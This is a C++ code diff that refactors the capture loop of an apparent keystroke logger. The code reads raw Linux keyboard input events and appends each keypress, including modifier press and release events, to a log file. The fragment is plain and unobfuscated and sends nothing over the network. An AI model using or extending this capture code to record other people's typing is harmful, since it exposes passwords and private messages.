@@ -45,13 +45,21 @@ class Keyboard {
 
     void openDeviceFile() { deviceFile = open(devicePath.c_str(), O_RDONLY); }
 
+    bool isModifierKey(const char* key);
+
     void capture();
 };
+
+bool Keyboard::isModifierKey(const char* key) {
+    return (std::strncmp(key, "<su", 3) == 0 ||
+            std::strncmp(key, "<l-", 3) == 0 ||
+            std::strncmp(key, "<r-", 3) == 0);
+}
 
 void Keyboard::capture() {
     int readEvent, eventType;
     struct input_event keyEvent[64];
-    const char* output;
+    const char* keyOutput;
 
     // Open log file and keyboard device file
     std::ofstream logFileStream(captureLog, std::ios::app);
@@ -71,18 +79,16 @@ void Keyboard::capture() {
 
             if (readEvent > 0) {
                 eventType = keyEvent[1].value;
-                output = keys[keyEvent[1].code];
+                keyOutput = keys[keyEvent[1].code];
                 /* Record press and release for
                    modifier keys (shift, ctrl, and super) */
-                if (eventType != 2 && (std::strncmp(output, "<su", 3) == 0 ||
-                                       std::strncmp(output, "<l-", 3) == 0 ||
-                                       std::strncmp(output, "<r-", 3) == 0)) {
-                    DEBUG_STDOUT(output + (" " + std::to_string(eventType)));
-                    logFileStream << output << " " << keyEvent[1].value
+                if (eventType != 2 && isModifierKey(keyOutput)) {
+                    logFileStream << keyOutput << " " << keyEvent[1].value
                                   << std::endl;
-                } else if (eventType != 0) {
-                    logFileStream << output << std::endl;
-                    DEBUG_STDOUT(output);
+                    DEBUG_STDOUT(keyOutput + (" " + std::to_string(eventType)));
+                } else if (eventType != 0 && !(isModifierKey(keyOutput))) {
+                    logFileStream << keyOutput << std::endl;
+                    DEBUG_STDOUT(keyOutput);
                 }
             }
         }
